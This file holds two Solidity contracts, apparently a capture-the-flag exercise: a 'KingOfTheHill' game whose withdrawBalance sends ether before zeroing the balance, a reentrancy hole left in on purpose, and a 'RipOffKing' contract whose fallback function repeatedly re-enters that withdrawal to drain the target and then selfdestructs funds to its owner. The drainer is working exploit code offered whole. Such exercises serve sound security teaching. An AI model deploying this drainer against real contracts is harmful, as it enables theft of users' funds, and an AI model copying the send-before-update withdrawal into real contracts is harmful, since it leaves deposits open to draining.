pragma solidity ^0.4.23;

contract RipOffKing {
    
    address public owner;
    address public target;
    uint amount;
    
    constructor(address _target) public {
        require(_target != 0);
        owner = msg.sender;
        target = _target;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function drain() public onlyOwner {
        selfdestruct(owner);
    }
    
    function setKing() public onlyOwner payable {
        KingOfTheHill(target).setKing();
    }
    
    function withdrawBalance() public onlyOwner {
        amount = target.balance;
        KingOfTheHill(target).withdrawBalance();        
    }
    
    function () public payable {
        if (amount > 0) {
            amount -= 100000000000000000;
            KingOfTheHill(target).withdrawBalance();
        }
    }
    
}


pragma solidity ^0.4.23;

/**
 * @dev this contract represents a game which can be won after the fifteenth king (or higher)
 * announces the end of the game and all participants redeemed their balance which they send
 * to the smart contract in order to participate. Or... Perhaps there is a different way to win?
 */
contract KingOfTheHill {

  event winnerAnnounced(address winner, string yourName);

  // state variables
  mapping(address => uint) public balances;
  address public king;
  uint public allowedChanges;
  uint public changesMade;
  bool public endOfGame;

  constructor(uint _allowedChanges) public {
    allowedChanges = _allowedChanges;
  }

  modifier onlyKing() {
    require(msg.sender == king);
    _;
  }

  /**
   * @dev this function allows anybody to set himself to be the new king when he sends at a minimal
   * 1/10th of a Ether together with the function call. An address which is currently a King
   * cannot call this function and the function cannot be called if the end of the game is already declared
   */
  function setKing() public payable {
    require(!endOfGame);
    //1/10th of an ether
    require(msg.value == 100000000000000000);
    require(msg.sender != king);
    king = msg.sender;
    balances[king] = balances[king] + msg.value;
    changesMade += 1;
  }

  /**
   * @dev any king which comes after the 14th king can call this function and end the game
   */
  function announceEndOfGame() public onlyKing {
    require(changesMade >= allowedChanges);
    endOfGame = true;
  }

  /**
   * @dev after the end of the game is announced, players can call this function
   * to withdraw the money which the put in the contract in order to participate
   */
  function withdrawBalance() public {
    require(endOfGame);
    msg.sender.call.value(balances[msg.sender])();
    balances[msg.sender] = 0;
  }

  /**
   * @dev a king can announce victory after the end of the game has been announced
   * and all players have withdrawn their balance. Or...?
   */
  function announceVictory(string yourName) public onlyKing {
    require(endOfGame && address(this).balance == 0);
    emit winnerAnnounced(msg.sender, yourName);
  }
}